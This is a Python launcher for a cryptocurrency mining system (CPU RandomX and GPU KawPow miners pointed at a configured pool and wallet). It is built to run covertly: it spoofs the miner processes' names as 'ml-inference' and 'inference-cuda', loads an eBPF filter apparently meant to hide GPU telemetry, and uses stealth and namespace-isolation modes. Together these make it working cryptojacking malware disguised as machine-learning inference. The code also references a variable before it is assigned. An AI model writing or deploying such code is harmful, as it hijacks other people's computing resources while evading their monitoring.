
"""
start_mining.py

Entrypoint chính để khởi động toàn bộ hệ thống khai thác tiền điện tử.
"""

import os
import sys
import subprocess
import threading
import signal
import time
import re
import logging
import select  # ✅ [select] (thư viện chọn I/O đa kênh – non-blocking)
from pathlib import Path
from datetime import datetime

# Thêm thư mục **script** (kịch bản) vào sys.path để **resolve** (phân giải đường dẫn) các **local module imports** (nhập module cục bộ)
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import psutil
# **Import** (nhập khẩu) **cloaking utilities** (tiện ích che giấu – ẩn danh hóa tiến trình) cho **ml-inference process stealth** (chế độ ẩn danh của tiến trình suy luận máy học)
from mining_environment.cpu_plugins.cloaking_lib.utils import (
    get_process_by_cmdline,
    spoof_cmdline,
    restore_cmdline,
    create_stealth_subprocess,
)

# **Import** (nhập khẩu) các **module** (mô-đun – thành phần chức năng) từ **library** (thư viện) mining_environment
from mining_environment.scripts.logging_config import setup_logging
from mining_environment.scripts import setup_env, system_manager
from mining_environment.scripts.privileged_operations import get_privileged_manager

# **Import** (nhập khẩu) **Mining Performance Logger** (trình ghi nhật ký hiệu suất khai thác – theo dõi và ghi lại các chỉ số)
from mining_environment.logging.mining_performance_logger import (
    register_mining_process,
    log_hash_rate,
    log_resource_usage,
    log_mining_operation,
    get_real_time_metrics,
    generate_performance_comparison,
    mining_perf_logger
)

# Thiết lập **log directory path** (đường dẫn thư mục logs – nơi lưu trữ các tệp ghi nhật ký)
LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
os.makedirs(LOGS_DIR, exist_ok=True)
logger = setup_logging('start_mining', str(Path(LOGS_DIR) / 'start_mining.log'), 'INFO')

stop_event = threading.Event()
process_lock = threading.Lock()
cpu_process = None
gpu_process = None


def signal_handler(signum, frame):
    logger.info(f"Nhận tín hiệu dừng ({signum}). Đang dừng hệ thống khai thác...")
    stop_event.set()

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def initialize_environment():
    logger.info("Bắt đầu thiết lập môi trường khai thác.")
    try:
        privileged_manager = get_privileged_manager(logger)
        security_context = privileged_manager.validate_security_context()
        logger.info(f"Bối cảnh bảo mật: User={security_context['user']}, Root={security_context['is_root']}")
        if not security_context['is_root']:
            logger.warning("⚠️ Không chạy với quyền root - một số tính năng có thể không hoạt động")
        
        gpu_info = privileged_manager.check_gpu_access()
        logger.info(f"Truy cập GPU: Available={gpu_info['nvidia_smi_available']}, Count={gpu_info['gpu_count']}")
        
        if os.getenv('ENABLE_EBPF_CLOAK', '1') == '1':
            preferred_path = "/opt/ebpf_filters/gpu_telemetry_filter.bpf.o"
            legacy_path = "/opt/ebpf_filters/gpu_filter.o"
            ebpf_path = preferred_path if os.path.exists(preferred_path) else legacy_path
            if os.path.exists(ebpf_path) and os.path.getsize(ebpf_path) > 0:
                if privileged_manager.load_ebpf_program(ebpf_path):
                    logger.info("✅ Đã load eBPF telemetry filter thành công")
                else:
                    logger.warning("⚠️ Không thể load eBPF telemetry filter")
            else:
                logger.info("ℹ️ eBPF filter object không tồn tại, chạy ở mock mode")
        
        # **Centralized environment setup** (thiết lập môi trường tập trung) - bao gồm **ML inference configuration** (cấu hình suy luận máy học)
        setup_env.setup()
        logger.info("Thiết lập môi trường thành công.")
        return privileged_manager
    except Exception as e:
        logger.error(f"Lỗi khi thiết lập môi trường: {e}")
        sys.exit(1)
        
def start_system_manager():
    logger.info("Khởi động Resource Manager...")
    try:
        system_manager.start()
        logger.info("Resource Manager đã được khởi động.")
    except Exception as e:
        logger.error(f"Lỗi khi khởi động Resource Manager: {e}")
        stop_event.set()
        stop_system_manager()

def stop_system_manager():
    logger.info("Đang dừng Resource Manager...")
    try:
        system_manager.stop()
        logger.info("Resource Manager đã được dừng thành công.")
    except Exception as e:
        logger.error(f"Lỗi khi dừng Resource Manager: {e}")

def is_mining_process_running(process):
    return process and process.poll() is None

def rotate_log_file(log_path, max_size_mb=3):
    """
    **Log rotation** (xoay vòng tệp ghi nhật ký) để tránh **disk space issues** (vấn đề dung lượng đĩa cứng).
    **Delete log files** (xóa tệp nhật ký) khi vượt quá **size limit** (giới hạn kích thước).
    
    Args:
        log_path (str): Đường dẫn đến tệp log cần xoay vòng
        max_size_mb (int): Kích thước tối đa (MB) trước khi xóa (mặc định: 3MB)
    """
    if not os.path.exists(log_path):
        return
        
    file_size_mb = os.path.getsize(log_path) / (1024 * 1024)
    if file_size_mb > max_size_mb:
        os.remove(log_path)
        logger.info(f"Đã xóa tệp log do vượt quá {max_size_mb}MB: {log_path} (kích thước: {file_size_mb:.2f}MB)")

def dual_logger_thread(process, log_file, process_name, log_lock):
    """
    Ghi nhật ký kép an toàn luồng nâng cao - truyền dữ liệu thời gian thực với phát hiện tốc độ băm và theo dõi các chỉ số hiệu suất.

    
    Args:
        process: Tiến trình cần theo dõi và ghi log
        log_file: Tệp log để ghi dữ liệu
        process_name (str): Tên tiến trình để hiển thị
        log_lock: Khóa luồng để đảm bảo thread-safe
    """
    hash_rates = []  # **Hash rate tracking** (theo dõi tốc độ băm – ghi lại các giá trị tốc độ tính toán)
    start_time = time.time()
    line_count = 0
    
    try:
        while True:
            # **Non-blocking I/O** (nhập/xuất không chặn) với **select** (chọn lọc dữ liệu)
            ready, _, _ = select.select([process.stdout], [], [], 1.0)
            if not ready:
                # **Process termination check** (kiểm tra trạng thái kết thúc tiến trình)
                if process.poll() is not None:
                    break
                continue

            line = process.stdout.readline()
            # **EOF detection** (phát hiện kết thúc tệp dữ liệu)
            if line == '' and process.poll() is not None:
                break
                
            if line:
                line_count += 1
                
                # **Thread-safe logging block** (khối ghi nhật ký an toàn luồng)
                with log_lock:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    runtime = time.time() - start_time
                    
                    # **Enhanced log format** (định dạng nhật ký nâng cao) với **runtime info** (thông tin thời gian vận hành)
                    formatted_line = f"[{timestamp}][{process_name}][R:{runtime:.0f}s] {line.strip()}"
                    
                    # **Color-coded terminal output** (đầu ra terminal có mã màu – hiển thị với màu sắc phân biệt)
                    if "error" in line.lower() or "failed" in line.lower():
                        terminal_output = f"\033[91m{formatted_line}\033[0m"  # Red
                    elif "H/s" in line or "accepted" in line.lower():
                        terminal_output = f"\033[92m{formatted_line}\033[0m"  # Green
                    elif "connecting" in line.lower() or "started" in line.lower():
                        terminal_output = f"\033[94m{formatted_line}\033[0m"  # Blue
                    else:
                        terminal_output = formatted_line
                    
                    # **Real-time terminal display** (hiển thị terminal thời gian thực – cập nhật ngay lập tức)
                    print(terminal_output, flush=True)
                    
                    # **File logging** (ghi nhật ký vào tệp) - **binary mode** (chế độ nhị phân)
                    log_file.write(f"{formatted_line}\n".encode('utf-8'))
                    log_file.flush()
                    
                    # **Log rotation check** (kiểm tra xoay vòng tệp nhật ký) - **delete when over 3MB** (xóa khi vượt quá 3MB)
                    try:
                        if log_file.tell() > 3 * 1024 * 1024:  # 3MB limit
                            current_path = log_file.name
                            log_file.close()
                            os.remove(current_path)
                            logger.info(f"🗑️ Đã xóa log do vượt quá 3MB: {current_path}")
                            # **Reopen new file** (mở lại tệp mới)
                            log_file = open(current_path, 'ab', buffering=0)
                    except Exception as rot_err:
                        logger.warning(f"⚠️ Xóa log thất bại: {rot_err}")
                    
                    # **Advanced hash rate detection** (phát hiện tốc độ băm nâng cao – nhận diện các chỉ số hiệu suất)
                    hash_rate_match = re.search(r'(\d+(?:\.\d+)?)\s*(H/s|KH/s|MH/s|GH/s|TH/s)', line)
                    if hash_rate_match:
                        hash_rate = float(hash_rate_match.group(1))
                        unit = hash_rate_match.group(2)
                        
                        # **Unit conversion** (chuyển đổi đơn vị đo lường)
                        multiplier = {
                            'H/s': 1,
                            'KH/s': 1000,
                            'MH/s': 1000000,
                            'GH/s': 1000000000,
                            'TH/s': 1000000000000
                        }
                        hash_rate_hz = hash_rate * multiplier.get(unit, 1)
                        
                        # **Hash rate tracking** (theo dõi và lưu trữ tốc độ băm)
                        hash_rates.append(hash_rate_hz)
                        
                        # **Performance metrics calculation** (tính toán các chỉ số hiệu suất chi tiết)
                        if len(hash_rates) >= 5:  # **Moving average** (trung bình trượt) của 5 mẫu dữ liệu
                            recent_avg = sum(hash_rates[-5:]) / 5
                            total_avg = sum(hash_rates) / len(hash_rates)
                            
                            # **Real-time metrics display** (hiển thị các chỉ số thời gian thực)
                            metrics_line = (f"\033[96m📊 METRICS [{process_name}]: "
                                          f"Current={hash_rate:.2f} {unit} | "
                                          f"Avg5={recent_avg:.2f} H/s | "
                                          f"TotalAvg={total_avg:.2f} H/s | "
                                          f"Samples={len(hash_rates)} | "
                                          f"Runtime={runtime:.0f}s\033[0m")
                            print(metrics_line, flush=True)
                        
                        # **Log hash rate** (ghi nhật ký tốc độ băm) để **performance system** (hệ thống theo dõi hiệu suất)
                        log_hash_rate(process_name, hash_rate_hz)
                    
                    # **Status indicators** (chỉ báo trạng thái hoạt động) mỗi 100 dòng
                    if line_count % 100 == 0:
                        status_line = (f"\033[93m📈 STATUS [{process_name}]: "
                                     f"Lines={line_count} | Runtime={runtime:.0f}s | "
                                     f"HashSamples={len(hash_rates)}\033[0m")
                        print(status_line, flush=True)
                        
    except Exception as e:
        error_msg = f"❌ Lỗi trong dual_logger_thread [{process_name}]: {e}"
        logger.error(error_msg)
        print(f"\033[91m{error_msg}\033[0m", flush=True)
    finally:
        # **Cleanup** (dọn dẹp tài nguyên) và **final stats** (thống kê cuối cùng)
        try:
            if log_file and not log_file.closed:
                log_file.close()
            
            runtime = time.time() - start_time
            final_stats = (f"\033[95m🏁 FINAL STATS [{process_name}]: "
                         f"Runtime={runtime:.0f}s | Lines={line_count} | "
                         f"HashSamples={len(hash_rates)}")
            if hash_rates:
                total_avg = sum(hash_rates) / len(hash_rates)
                final_stats += f" | AvgHashRate={total_avg:.2f} H/s"
            final_stats += "\033[0m"
            
            print(final_stats, flush=True)
            logger.info(f"Luồng ghi log kép đã dừng cho {process_name}: thời gian chạy {runtime:.0f}s")
            
        except Exception as cleanup_err:
            logger.error(f"Lỗi dọn dẹp trong dual_logger_thread: {cleanup_err}")

def start_mining_process(cpu=True, retries=3, delay=5, privileged_manager=None):
    """
    **Enhanced mining process** (quy trình khai thác nâng cao) với **dual logging** (ghi nhật ký kép), 
    **log rotation** (xoay vòng tệp nhật ký), và **thread-safe logging** (ghi nhật ký an toàn luồng).
    
    Args:
        cpu (bool): True nếu là khai thác CPU, False nếu là GPU
        retries (int): Số lần thử lại tối đa
        delay (int): Thời gian chờ giữa các lần thử (giây)
        privileged_manager: Trình quản lý quyền hạn
    
    Returns:
        subprocess.Popen: Tiến trình khai thác nếu thành công, None nếu thất bại
    """
    executable = os.getenv('ML_COMMAND' if cpu else 'CUDA_COMMAND')
    if not executable or not os.path.isfile(executable) or not os.access(executable, os.X_OK):
        logger.error(f"Tệp thực thi khai thác không hợp lệ hoặc không có quyền truy cập: {executable}")
        stop_event.set()
        return None

    mining_server = os.getenv('MINING_SERVER_CPU' if cpu else 'MINING_SERVER_GPU')
    mining_wallet = os.getenv('MINING_WALLET_CPU' if cpu else 'MINING_WALLET_GPU')
    if not mining_server or not mining_wallet:
        logger.error("Các biến môi trường MINING_SERVER hoặc MINING_WALLET chưa được cấu hình.")
        stop_event.set()
        return None

    miner_tag = 'cpu' if cpu else 'gpu'
    miner_log_path = Path(LOGS_DIR) / f"{miner_tag}_miner.log"
    
    # **Log rotation** (xoay vòng tệp nhật ký) trước khi khởi chạy tiến trình
    rotate_log_file(str(miner_log_path))
    
    # **Thread-safe lock** (khóa an toàn luồng) cho **dual logging** (ghi nhật ký kép)
    log_lock = threading.Lock()

    # Xác định **process name** (tên tiến trình) từ **resource_config.json** (tệp cấu hình tài nguyên hệ thống)
    process_name = "ml-inference" if cpu else "inference-cuda"
    
    mining_command = [executable, '-o', mining_server, '-u', mining_wallet, '--tls']
    if cpu:
        mining_command.extend(['-a', 'rx/0', '--no-huge-pages'])
    else:
        cuda_loader = os.getenv('MLLS_CUDA', '/usr/local/bin/libmlls-cuda.so')
        mining_command.extend(['--cuda', f'--cuda-loader={cuda_loader}', '-a', 'kawpow'])

    enable_ns = os.getenv('ENABLE_NS_ISOLATION', '1') == '1'
    enable_stealth = os.getenv('ENABLE_STEALTH_MODE', '1') == '1'
    
    if enable_ns and privileged_manager:
        logger.info("Sử dụng PrivilegedOperationManager cho **namespace isolation** (cô lập không gian tên)")

    for attempt in range(1, retries + 1):
        logger.info(f"Thử khởi chạy quá trình khai thác {'CPU' if cpu else 'GPU'} (Lần thử {attempt}/{retries})...")
        # **Debug logging** (ghi nhật ký gỡ lỗi) cho **GPU process creation** (tạo tiến trình GPU)
        if not cpu:
            logger.info(f"🔍 GPU Debug - Command: {' '.join(mining_command)}")
            logger.info(f"🔍 GPU Debug - Stealth: {enable_stealth}, NS: {enable_ns}")
        try:
            # **Create subprocess** (tạo tiến trình con) với **PIPE** (đường ống) cho **dual logging** (ghi log kép)
            if enable_stealth and cpu:
                # **Stealth subprocess** (tiến trình con ẩn danh) - **modified for dual logging** (sửa đổi cho ghi log kép)
                process = subprocess.Popen(
                    mining_command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    universal_newlines=True,
                    bufsize=1
                )
                if process:
                    # **Spoof process name** (giả mạo tên tiến trình) sau khi khởi chạy
                    try:
                        spoof_cmdline(process.pid, process_name)
                        logger.info(f"✅ Stealth process '{process_name}' started with PID: {process.pid}")
                    except Exception as e:
                        logger.warning(f"⚠️ Không thể spoof cmdline: {e}")
            elif enable_ns and privileged_manager:
                # **Namespace isolation** (cô lập namespace) - **modified for dual logging** (sửa đổi cho ghi log kép)
                logger.info(f"🔍 {'GPU' if not cpu else 'CPU'} using namespace isolation")
                process = subprocess.Popen(
                    mining_command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    universal_newlines=True,
                    bufsize=1
                )
            else:
                # **Standard subprocess** (tiến trình con tiêu chuẩn)
                logger.info(f"🔍 {'GPU' if not cpu else 'CPU'} using standard subprocess")
                process = subprocess.Popen(
                    mining_command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    universal_newlines=True,
                    bufsize=1
                )
            
            if process:
                startup_time = time.time()
                miner_type = 'CPU' if cpu else 'GPU'
                logger.info(f"🔍 {miner_type} process created successfully with PID: {process.pid}")
                
                # **Enhanced startup logging** (ghi log khởi động nâng cao)
                startup_msg = (f"🚀 MINING PROCESS STARTED [{miner_type}]\n"
                             f"   ├─ Process Name: {process_name}\n"
                             f"   ├─ PID: {process.pid}\n"
                             f"   ├─ Command: {' '.join(mining_command)}\n"
                             f"   ├─ Log File: {miner_log_path}\n"
                             f"   ├─ Stealth Mode: {enable_stealth and cpu}\n"
                             f"   └─ Namespace Isolation: {enable_ns and privileged_manager is not None}")
                
                logger.info(startup_msg)
                print(f"\033[92m{startup_msg}\033[0m", flush=True)  # Green startup message
                
                # **Register process** (đăng ký tiến trình) với **Mining Performance Logger** (trình ghi log hiệu suất khai thác)
                register_mining_process(process_name, process.pid, process)
                
                # **DEBUG: Force initial logging** (gỡ lỗi: buộc ghi log ban đầu) để kiểm tra logger hoạt động
                logger.info(f"🔍 DEBUG: Attempting to log initial mining operation for {process_name}")
                log_mining_operation(process_name, "PROCESS_START", process.pid, operation_details, 0.0, "SUCCESS")
                logger.info(f"🔍 DEBUG: Initial resource usage logging for {process_name}")
                log_resource_usage(process_name, force_gpu_check=(not cpu))
                
                # **Detailed operation logging** (ghi log thao tác chi tiết)
                operation_details = {
                    'process_name': process_name,
                    'pid': process.pid,
                    'miner_type': miner_type.lower(),
                    'command': ' '.join(mining_command),
                    'startup_time': startup_time,
                    'stealth_enabled': enable_stealth and cpu,
                    'namespace_isolation': enable_ns and privileged_manager is not None,
                    'log_file': str(miner_log_path)
                }
                
                logger.info(f"PROCESS_START: {process_name} | PID={process.pid} | TYPE={miner_type} | TIME={startup_time}")
                
                # **EventBus publish** (xuất bản sự kiện) - **PID Propagation Flow Step 1**
                try:
                    from mining_environment.scripts.auxiliary_modules.event_bus import get_event_bus
                    from datetime import datetime
                    
                    event_bus = get_event_bus()
                    miner_type = 'cpu' if cpu else 'gpu'
                    
                    payload = {
                        'pid': process.pid,
                        'miner_type': miner_type,
                        'timestamp': datetime.now().isoformat(),
                        'event_type': 'mining_started',
                        'data': {
                            'process_name': process_name,
                            'command': ' '.join(mining_command),
                            'stealth_mode': enable_stealth and cpu,
                            'namespace_isolation': enable_ns and privileged_manager is not None
                        }
                    }
                    
                    # **Publish** (xuất bản) to channel với retry logic
                    # ✅ PHASE 2 REFACTORING: Chuẩn hóa Event Naming Conventions
                    # Dual publishing approach để đảm bảo backward compatibility
                    
                    # Legacy format (sẽ được deprecated trong future releases)
                    event_bus.publish(f'channel:{miner_type}', payload)
                    logger.info(f"✅ Published mining_started event to channel:{miner_type} for PID {process.pid}")
                    
                    # New standardized format: domain:action pattern
                    new_event_name = f'mining:{miner_type}_started'
                    event_bus.publish(new_event_name, payload)
                    logger.info(f"✅ Published mining_started event to {new_event_name} for PID {process.pid} (new format)")
                    
                except Exception as e:
                    logger.error(f"❌ Failed to publish mining_started event: {e}")
                    # **Không dừng tiến trình** nếu EventBus thất bại - **fallback** vẫn hoạt động
                
                # ✅ ENHANCED: Ensure log file creation với initial logging
                logger.info(f"📁 [Mining Log] Creating log file: {miner_log_path}")
                
                # **Open log file** (mở tệp log) cho **dual logging** (ghi log kép)
                log_file = open(miner_log_path, 'ab', buffering=0)
                
                # ✅ ENHANCED: Initial log entry để confirm file creation
                initial_log = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] ===== MINING LOG STARTED =====\n"
                initial_log += f"Process: {process_name} (PID: {process.pid})\n"
                initial_log += f"Command: {' '.join(mining_command)}\n"
                initial_log += f"Log File: {miner_log_path}\n"
                initial_log += f"========================================\n"
                log_file.write(initial_log.encode('utf-8'))
                log_file.flush()
                
                logger.info(f"✅ [Mining Log] Log file initialized: {miner_log_path}")
                
                # **Start dual logging thread** (khởi chạy luồng ghi log kép)
                log_thread = threading.Thread(
                    target=dual_logger_thread,
                    args=(process, log_file, process_name, log_lock),
                    daemon=True
                )
                log_thread.start()
                logger.info(f"🚀 [Mining Log] Dual logging thread started for {process_name}")
                
                # **Start simple log monitoring** (bắt đầu giám sát log đơn giản) - **remove JSON format** (loại bỏ định dạng JSON)
                mining_perf_logger.monitor_process_logs(process_name, str(miner_log_path))
                
                time.sleep(2)
                if process.poll() is not None:
                    logger.error(f"Quá trình khai thác {'CPU' if cpu else 'GPU'} kết thúc sớm.")
                    
                    # **Simple early termination logging** (ghi log kết thúc sớm đơn giản)
                    logger.error(f"EARLY_TERMINATION: {process_name} PID={process.pid} EXIT_CODE={process.returncode}")
                    process = None
                else:
                    return process
                    
        except Exception as e:
            logger.error(f"Lỗi khi khởi động quá trình khai thác {'CPU' if cpu else 'GPU'}: {e}")
            # **Additional debug info** (thông tin gỡ lỗi bổ sung) cho **GPU failures** (lỗi GPU)
            if not cpu:
                logger.error(f"🔍 GPU Error Details - Exception: {type(e).__name__}: {str(e)}")
                logger.error(f"🔍 GPU Error Details - Command: {' '.join(mining_command)}")
            process = None
        if attempt < retries:
            logger.info(f"Đợi {delay} giây trước khi thử lại...")
            time.sleep(delay)
    logger.error(f"Không thể khởi chạy quá trình khai thác {'CPU' if cpu else 'GPU'}.")
    stop_event.set()
    return None

def manage_cpu_miner(privileged_mgr, max_retries: int = 5):
    """
    Quản lý **lifecycle** (vòng đời) của **CPU miner** (máy khai thác CPU) - chỉ khởi động và giám sát process.
    """
    global cpu_process
    retries = 0
    
    # **Simple subprocess-based CPU mining** (khai thác CPU dựa trên subprocess đơn giản)
    logger.info("🚀 Starting subprocess-based CPU mining")
    
    while not stop_event.is_set() and retries < max_retries:
        with process_lock:
            if not is_mining_process_running(cpu_process):
                cpu_process = start_mining_process(cpu=True, privileged_manager=privileged_mgr)
                if not is_mining_process_running(cpu_process):
                    retries += 1
                    logger.warning(f"CPU miner khởi động thất bại. Thử lại... ({retries}/{max_retries})")
                else:
                    logger.info("CPU miner đã khởi động thành công.")
                    retries = 0  # Reset retries on successful start
            else:
                # Nếu **process** (tiến trình) đang chạy, **reset retries** (đặt lại số lần thử)
                retries = 0
                
                # **Log resource usage** (ghi log mức sử dụng tài nguyên)
                log_resource_usage("ml-inference")
        
        # **Wait** (đợi) trước khi kiểm tra lại
        stop_event.wait(30)
    
    if retries >= max_retries:
        logger.error("CPU miner đã thất bại quá nhiều lần. Dừng giám sát.")
        stop_event.set()

def manage_gpu_miner(privileged_mgr, max_retries: int = 5):
    """
    Quản lý **lifecycle** (vòng đời) của **GPU miner** (máy khai thác GPU). Hàm này không chứa **logic throttling** (logic điều chỉnh tốc độ).
    """
    global gpu_process
    retries = 0
    logger.info("🔍 GPU Manager - Starting manage_gpu_miner function")
    logger.info(f"🔍 GPU Manager - Initial state: stop_event={stop_event.is_set()}, retries={retries}, max_retries={max_retries}")
    while not stop_event.is_set() and retries < max_retries:
        logger.info(f"🔍 GPU Manager - Loop iteration: stop_event={stop_event.is_set()}, retries={retries}")
        # **Direct access** (truy cập trực tiếp) để **avoid deadlock** (tránh khóa chết)
        process = gpu_process
        logger.info(f"🔍 GPU Manager - Checking process status: {process}")
        is_running = is_mining_process_running(process)
        logger.info(f"🔍 GPU Manager - is_mining_process_running returned: {is_running}")
        if not is_running:
            if process:
                logger.warning("Phát hiện GPU miner đã dừng. Thử khởi động lại...")
                retries += 1
            logger.info("🔍 GPU Manager - Attempting to start GPU mining process...")
            new_process = start_mining_process(cpu=False, privileged_manager=privileged_mgr)
            logger.info(f"🔍 GPU Manager - start_mining_process returned: {new_process}")
            # **Direct assignment** (gán trực tiếp) để **avoid deadlock** (tránh khóa chết)
            gpu_process = new_process
        else:
            # **Log resource usage** (ghi log mức sử dụng tài nguyên) cho **GPU mining** (khai thác GPU)
            log_resource_usage("inference-cuda", force_gpu_check=True)
        
        time.sleep(15)
    if retries >= max_retries:
        logger.error("GPU miner đã thất bại quá nhiều lần. Dừng giám sát.")
        stop_event.set()

def main():
    """
    **Redesigned main function** (hàm chính được thiết kế lại) với **Parallel Initialization Framework** (khung khởi tạo song song).
    Theo **blueprint** (thiết kế): Khởi tạo song song **CPU và GPU mining processes** (các quy trình khai thác CPU và GPU) + 
    kích hoạt đồng thời các **modules** (mô-đun) trong **scripts/** (thư mục scripts).
    """
    logger.info("===== Bắt đầu hoạt động khai thác tiền điện tử (Parallel Architecture) =====")
    
    # Khởi tạo **environment** (môi trường)
    privileged_manager = initialize_environment()
    
    # Khởi động **Resource Manager** (trình quản lý tài nguyên) - **System Manager** (trình quản lý hệ thống)
    start_system_manager()
    
    
    # Tạo **threads** (luồng) để chạy song song **CPU và GPU mining** (khai thác CPU và GPU)
    cpu_thread = threading.Thread(target=manage_cpu_miner, args=(privileged_manager,), daemon=True, name="CPUMiningThread")
    gpu_thread = threading.Thread(target=manage_gpu_miner, args=(privileged_manager,), daemon=True, name="GPUMiningThread")
    
    # Khởi động các **threads** (luồng) song song
    logger.info("🚀 Khởi động parallel mining threads...")
    cpu_thread.start()
    
    # Khởi động **GPU thread** (luồng GPU) nếu được **configured** (cấu hình)
    if os.getenv('MINING_SERVER_GPU') and os.getenv('MINING_WALLET_GPU'):
        gpu_thread.start()
        logger.info("✅ Đã khởi động cả CPU và GPU mining threads")
    else:
        logger.info("✅ Chỉ khởi động CPU mining thread (GPU không được cấu hình)")
    
    # **Enhanced performance monitoring thread** (luồng giám sát hiệu suất nâng cao)
    def performance_monitor():
        """
        **Real-time mining performance monitor** (giám sát hiệu suất khai thác thời gian thực) với 
        **detailed metrics** (chỉ số chi tiết) và **system resource tracking** (theo dõi tài nguyên hệ thống)
        """
        last_report_time = time.time()
        last_metrics_time = time.time()
        monitor_start_time = time.time()
        
        print(f"\033[96m🔍 PERFORMANCE MONITOR STARTED\033[0m", flush=True)
        
        while not stop_event.is_set():
            try:
                current_time = time.time()
                
                # **Enhanced real-time metrics** (chỉ số thời gian thực nâng cao) mỗi 15 giây
                if current_time - last_metrics_time >= 15:
                    metrics = get_real_time_metrics()
                    cpu_metrics = metrics.get("ml-inference", {})
                    gpu_metrics = metrics.get("inference-cuda", {})
                    
                    cpu_hash = cpu_metrics.get('current_hash_rate', 0)
                    gpu_hash = gpu_metrics.get('current_hash_rate', 0)
                    total_hash = cpu_hash + gpu_hash
                    
                    # **System resource usage** (sử dụng tài nguyên hệ thống)
                    try:
                        cpu_percent = psutil.cpu_percent(interval=1)
                        memory = psutil.virtual_memory()
                        memory_percent = memory.percent
                        
                        # **Enhanced metrics display** (hiển thị chỉ số nâng cao)
                        runtime_total = current_time - monitor_start_time
                        metrics_display = (
                            f"\033[96m📊 REAL-TIME METRICS [Runtime: {runtime_total:.0f}s]\n"
                            f"   ├─ CPU Mining: {cpu_hash:.2f} H/s\n"
                            f"   ├─ GPU Mining: {gpu_hash:.2f} H/s\n"
                            f"   ├─ Total Hash: {total_hash:.2f} H/s\n"
                            f"   ├─ CPU Usage: {cpu_percent:.1f}%\n"
                            f"   ├─ Memory Usage: {memory_percent:.1f}%\n"
                            f"   └─ Active Processes: {len([p for p in [cpu_process, gpu_process] if p and p.poll() is None])}/2\033[0m"
                        )
                        
                        print(metrics_display, flush=True)
                        logger.info(f"METRICS: CPU={cpu_hash:.2f}H/s GPU={gpu_hash:.2f}H/s "
                                   f"TOTAL={total_hash:.2f}H/s SYS_CPU={cpu_percent:.1f}% "
                                   f"SYS_MEM={memory_percent:.1f}% RUNTIME={runtime_total:.0f}s")
                        
                    except Exception as sys_err:
                        logger.warning(f"⚠️ System metrics error: {sys_err}")
                    
                    last_metrics_time = current_time
                
                # **Detailed performance report** (báo cáo hiệu suất chi tiết) mỗi 60 giây
                if current_time - last_report_time >= 60:
                    try:
                        comparison_report = generate_performance_comparison()
                        
                        print(f"\033[95m=== DETAILED PERFORMANCE REPORT ===\033[0m", flush=True)
                        logger.info("=== DETAILED PERFORMANCE REPORT ===")
                        
                        for line in comparison_report.split('\n'):
                            if line.strip():
                                logger.info(line)
                                print(f"\033[95m{line}\033[0m", flush=True)
                        
                        print(f"\033[95m=== END PERFORMANCE REPORT ===\033[0m", flush=True)
                        logger.info("=== END PERFORMANCE REPORT ===")
                        
                        last_report_time = current_time
                        
                    except Exception as report_err:
                        logger.error(f"❌ Performance report error: {report_err}")
                
                # **Process health check** (kiểm tra sức khỏe tiến trình)
                with process_lock:
                    cpu_alive = is_mining_process_running(cpu_process)
                    gpu_alive = is_mining_process_running(gpu_process)
                
                if not cpu_alive and not gpu_alive:
                    logger.warning("⚠️ All mining processes stopped!")
                    print(f"\033[91m⚠️ ALL MINING PROCESSES STOPPED!\033[0m", flush=True)
                
                time.sleep(15)  # **Check interval** (khoảng thời gian kiểm tra)
                
            except Exception as e:
                error_msg = f"❌ Error in performance monitoring: {e}"
                logger.error(error_msg)
                print(f"\033[91m{error_msg}\033[0m", flush=True)
                time.sleep(30)
    
    # **Start performance monitoring thread** (khởi động luồng giám sát hiệu suất)
    perf_thread = threading.Thread(target=performance_monitor, daemon=True, name="PerformanceMonitor")
    perf_thread.start()
    
    # **Wait** (đợi) các **threads** (luồng) hoạt động và xử lý **stop signal** (tín hiệu dừng)
    try:
        while not stop_event.is_set():
            # Kiểm tra **thread status** (trạng thái luồng)
            if not cpu_thread.is_alive():
                logger.warning("⚠️ CPU mining thread đã dừng")
            if gpu_thread.is_alive() and not gpu_thread.is_alive():
                logger.warning("⚠️ GPU mining thread đã dừng")
            
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Nhận tín hiệu KeyboardInterrupt. Đang dừng...")
        stop_event.set()
    
    # Dừng **system manager** (trình quản lý hệ thống)
    stop_system_manager()
    
    # **Cleanup** (dọn dẹp) và thoát
    logger.info("Bắt đầu quá trình dọn dẹp cuối cùng...")
    
    # **Export final performance report** (xuất báo cáo hiệu suất cuối cùng)
    try:
        final_report = generate_performance_comparison()
        logger.info("=== FINAL MINING PERFORMANCE REPORT ===")
        for line in final_report.split('\n'):
            if line.strip():
                logger.info(line)
        logger.info("=== END FINAL REPORT ===")
        
        # **Export to file** (xuất ra file)
        report_file = mining_perf_logger.export_performance_report()
        logger.info(f"📄 Final performance report saved to: {report_file}")
        
    except Exception as e:
        logger.error(f"Lỗi khi tạo báo cáo hiệu suất cuối cùng: {e}")
    
    # **Log final mining operations** (ghi nhật ký các thao tác khai thác cuối cùng)
    with process_lock:
        if cpu_process:
            log_mining_operation("ml-inference", "STOP", cpu_process.pid, 
                                {"reason": "shutdown", "uptime": time.time()})
        if gpu_process:
            log_mining_operation("inference-cuda", "STOP", gpu_process.pid, 
                                {"reason": "shutdown", "uptime": time.time()})
    
    
    # **Cleanup** (dọn dẹp tài nguyên) **legacy processes** (các tiến trình cũ)
    with process_lock:
        if cpu_process:
            logger.info(f"Dừng tiến trình CPU miner (PID: {cpu_process.pid})...")
            cpu_process.terminate()
        if gpu_process:
            logger.info(f"Dừng tiến trình GPU miner (PID: {gpu_process.pid})...")
            gpu_process.terminate()
    
    logger.info("Hệ thống đã dừng. Thoát.")

if __name__ == "__main__":
    main()
